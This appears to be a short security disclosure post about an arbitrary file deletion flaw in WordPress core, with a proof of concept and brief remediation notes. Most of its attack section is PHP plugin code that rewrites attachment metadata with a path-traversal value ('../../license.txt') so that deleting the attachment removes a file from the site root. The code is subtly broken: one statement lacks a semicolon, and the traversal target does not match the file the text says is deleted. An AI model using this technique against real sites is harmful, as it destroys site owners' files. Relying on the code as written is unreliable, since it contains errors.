# Wordpress arbitrary file delete

WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary file delete on the following way: limit the file (thumbnail) deletion only for the same folder where is file/attachment and make sure thumbnail isn’t used by another media file. Again, technical detailed writing is huge and more advanced (will be presented in near future), but goal of this writing is something else. :) 

## Eli5 PoC
- Upload picture in your WP and get its post_id / attachment_id
- this demo code will delete `readme.html` from WP root directory
- enable `hello.php` plugin and append this code at the end
```
function afd(){
    
    global $wpdb;
    
    $attachment_id = "93";
    $thumb = "readme.html" 
    //set up 'thumb' on the same way core does
    $newmeta          = wp_get_attachment_metadata( $attachment_id, true );
    $newmeta['thumb'] = wp_basename( $thumb );
    wp_update_attachment_metadata( $attachment_id, $newmeta );
    
    //set up apropriate value for _wp_attached_file
    $wpdb->query("UPDATE `wp_postmeta` SET `meta_value` = '../../license.txt' WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = '".esc_sql($attachment_id)."'");
    //delete attachment    
    wp_delete_attachment($attachment_id);
}

add_action("init", "afd");
```
- `readme.html` is deleted from the WP root

## Few facts
- `_wp_attached_file` remains single point of failure for WP
- there is use case in the core where creation of backup of any file is possible and this opens door for silent exploitation when arbitrary file delete is in game

## Remediation
- core files shouldn’t be writable by www-data user
- plugins files shouldn’t be writable by www-data user


